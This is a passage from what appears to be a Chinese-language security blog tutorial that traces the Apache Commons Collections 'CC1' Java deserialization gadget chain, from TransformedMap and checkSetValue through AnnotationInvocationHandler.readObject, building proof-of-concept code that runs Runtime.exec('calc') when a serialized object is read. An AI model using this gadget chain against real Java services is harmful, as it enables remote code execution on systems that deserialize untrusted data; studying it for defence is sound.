class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">putAll</span><span class="hljs-params">(Map mapToCopy)</span> &#123;<br>        mapToCopy = transformMap(mapToCopy);<br>        getMap().putAll(mapToCopy);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> å› ä¸ºæ„é€ å‡½æ•°æ˜¯ protectedï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ä¼ å‚ï¼Œæ‰€ä»¥æ‰¾åˆ°ä¸€ä¸ª<strong>å…¬å…±æ–¹æ³• decorate</strong> ï¼Œå¤–éƒ¨è°ƒç”¨å®ƒå°±èƒ½ new å‡ºä¸€ä¸ª TransformedMap å®ä¾‹ï¼Œ åˆ›å»ºå‡ºä¸€ä¸ª TransformedMap å¯¹è±¡ï¼Œå¹¶æŠŠè‡ªå·±çš„ Transformer å¡è¿›å»ï¼Œç„¶åé€šè¿‡è°ƒç”¨  checkSetValue() è§¦å‘ Transformer ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br><span class="hljs-comment">//ç”¨ decorate åŒ…è£…è¿™ä¸ª map</span><br><span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•° null ï¼šä¸å¯¹ key åšå˜æ¢</span><br><span class="hljs-comment">//ç¬¬ä¸‰ä¸ªå‚æ•° invokerTransformer ï¼šå¯¹ value åšå˜æ¢ï¼ˆå…³é”®ï¼‰</span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer); <br><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ‰¾è°è°ƒç”¨äº† checkSetValue() </p><p><strong>åœ¨ AbstractInputCheckedMapDecorator.****<font style="color:#080808;background-color:#ffffff;">MapEntry.setValue() è°ƒç”¨äº† checkSetValue() æ–¹æ³•</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806376.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Implementation of a map entry that checks additions via setValue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªé™æ€å†…éƒ¨ç±» MapEntryï¼Œå®ƒç»§æ‰¿è‡ª AbstractMapEntryDecorator</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>        <span class="hljs-comment">/** The parent map */</span><br>        <span class="hljs-comment">//å£°æ˜äº†ä¸€ä¸ªä¸å¯å˜ï¼ˆfinalï¼‰å­—æ®µ parentï¼Œç±»å‹æ˜¯ AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>        <span class="hljs-comment">//æ„é€ å™¨æ¥æ”¶ä¸¤ä¸ªå‚æ•°</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>            <span class="hljs-built_in">super</span>(entry);<br>            <span class="hljs-built_in">this</span>.parent = parent;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>MapEntry</code> æ˜¯ä¸€ä¸ª<strong>åŒ…è£…å™¨</strong>ï¼ŒæŠŠåŸå§‹ <code>Map.Entry</code> åŒ…èµ·æ¥ï¼Œç›®çš„å°±æ˜¯åœ¨ <code>setValue(...)</code> æ—¶æ’å…¥ä¸€æ¬¡ â€œç”± parent æ‰§è¡Œçš„æ£€æŸ¥&#x2F;å˜æ¢â€ï¼ˆå³è°ƒç”¨ <code>parent.checkSetValue(...)</code>ï¼‰ã€‚</li><li>ä¹Ÿå°±æ˜¯è¯´ï¼šä»»ä½•é€šè¿‡è¿™ä¸ªåŒ…è£…çš„ <code>Entry</code> è°ƒç”¨ <code>setValue</code> çš„æ“ä½œï¼Œéƒ½ä¼šå…ˆç»ç”± parent çš„ <code>checkSetValue</code>ï¼Œå†å›åˆ°åº•å±‚ <code>entry</code>ã€‚</li></ul><p><strong>å½“æ‰§è¡Œ entry.setValue(value) æ—¶ï¼Œä»–å…ˆè°ƒç”¨ checkSetValue(value)ï¼Œè€Œ checkSetValue(value) ç›´æ¥è°ƒç”¨äº†  transform ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br>map.put(<span class="hljs-string">&quot;gxngxngxn&quot;</span>,<span class="hljs-string">&quot;gxngxngxn&quot;</span>); <span class="hljs-comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span><br><span class="hljs-comment">//ç”¨ decorate åŒ…è£…è¿™ä¸ª mapï¼›ç¬¬äºŒä¸ªå‚æ•° null ï¼šä¸å¯¹ key åšå˜æ¢ï¼›ç¬¬ä¸‰ä¸ªå‚æ•° invokerTransformer ï¼šå¯¹ value åšå˜æ¢ï¼ˆå…³é”®ï¼‰</span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer); <br> <span class="hljs-keyword">for</span>(Map.Entry entry:transformedmap.entrySet()) &#123;<br>         <span class="hljs-comment">//è°ƒç”¨ entry.setValue(r)ï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯ Runtime r å¯¹è±¡</span><br>         <span class="hljs-comment">//ä½†æ˜¯åœ¨ MapEntry.setValue é‡Œï¼Œä¼šå…ˆæ‰§è¡Œparent.checkSetValue()</span><br>         <span class="hljs-comment">//checkSetValue(value) å†…éƒ¨ä¼šæ‰§è¡Œ return valueTransformer.transform(value);</span><br>         <span class="hljs-comment">//æ‰€ä»¥ä¼ è¿›æ¥çš„ r ä¼šè¢« invokerTransformer.transform(r) å¤„ç†</span><br>         entry.setValue(r);                       <br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806162.png"></p><p>é€šè¿‡ä¸Šè¿°æµ‹è¯•ï¼Œè¯´æ˜è¿™æ¡é“¾æ˜¯èƒ½æ‰“é€šçš„ï¼Œè§¦å‘æ¡ä»¶æ˜¯æ‰‹åŠ¨éå†äº† <code>transformedmap</code>ï¼Œè¿™ä¸æ˜¯çœŸæ­£çš„åˆ©ç”¨é“¾ï¼Œæ¥ä¸‹æ¥è¦å»æ‰¾ readObject æ¥è§¦å‘æ¼æ´ã€‚</p><p>åŒæ ·çš„ï¼ŒæŸ¥æ‰¾å“ªä¸ªæ–¹æ³•è°ƒç”¨äº† setValue ï¼Œæœ€å¥½æ˜¯é‡å†™çš„ readObject ã€‚</p><p>åœ¨ AnnotationInvocationHandler ç±»çš„ <font style="color:#080808;background-color:#ffffff;">readObject æ–¹æ³•é‡Œè°ƒç”¨äº† setValue æ–¹æ³•</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807086.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//è·å–æ³¨è§£é‡Œæ¯ä¸ªæˆå‘˜çš„ç±»å‹ï¼ˆæ–¹æ³•åï¼šè¿”å›ç±»å‹ï¼‰</span><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-comment">//æ£€æŸ¥å½“å‰å€¼æ˜¯å¦ä¸æˆå‘˜ç±»å‹åŒ¹é…ï¼Œæˆ–è€…æ˜¯ä¸æ˜¯ ExceptionProxy</span><br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                <span class="hljs-comment">//å¦‚æœä¸åŒ¹é…ï¼Œå°±è°ƒç”¨ï¼šmemberValue.setValue</span><br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>memberValues ä¹Ÿæ˜¯å¯æ§çš„</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807528.png"></p><h3 id="1-3-æ„é€ -POC-é‡åˆ°çš„é—®é¢˜ï¼š"><a href="#1-3-æ„é€ -POC-é‡åˆ°çš„é—®é¢˜ï¼š" class="headerlink" title="1.3 æ„é€  POC &amp; é‡åˆ°çš„é—®é¢˜ï¼š"></a>1.3 æ„é€  POC &amp; é‡åˆ°çš„é—®é¢˜ï¼š</h3><p>åˆæ­¥æ„é€ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†ç›®å‰è¿˜ä¸èƒ½æˆåŠŸåˆ©ç”¨ï¼Œæœ‰ä¸‰ä¸ªé—®é¢˜éœ€è§£å†³ï¼š</p><ol><li><code>Runtime</code> å¯¹è±¡ä¸å¯åºåˆ—åŒ–ï¼Œéœ€è¦é€šè¿‡åå°„å°†å…¶å˜æˆå¯ä»¥åºåˆ—åŒ–çš„å½¢å¼</li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807517.png"></p><p>åå°„è§£å†³ï¼š</p><p>å…ˆå†™æ™®é€šåå°„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br><span class="hljs-type">Method</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>run.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>); <br></code></pre></td></tr></table></figure><p>ç„¶åæ”¹ä¸º <code>InvokerTransformer</code> è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>        ).transform(Runtime.class);<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>        ).transform(m);<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        ).transform(r);<br></code></pre></td></tr></table></figure><p>ç”±äºä¸€ä¸ªä¸€ä¸ªè°ƒç”¨ transform å¤ªç¹çï¼Œæˆ‘ä»¬ä½¿ç”¨ ChainedTransformer ç±»è¿›è¡Œç®€åŒ–ï¼š</p><p><code>ChainedTransformer</code> ç±»ä¸‹çš„ <code>transform</code> æ–¹æ³•é€’å½’è°ƒç”¨äº†å‰ä¸€ä¸ªæ–¹æ³•çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªæ–¹æ³•çš„å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807331.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>                )<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚</p><ol start="2"><li><code>AnnotationInvocationHandler</code>ç±»ä¸­çš„åˆ¤æ–­æ¡ä»¶</li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png"></p><p>é€šè¿‡è°ƒè¯•å‘ç°ï¼Œ<font style="color:#080808;background-color:#ffffff;">memberType &#x3D; null æ‰€ä»¥ä¸è¿›å…¥ if åˆ¤æ–­ï¼Œæ— æ³•è°ƒç”¨ setValue</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png"></p><p><font style="color:#080808;background-color:#ffffff;">memberType 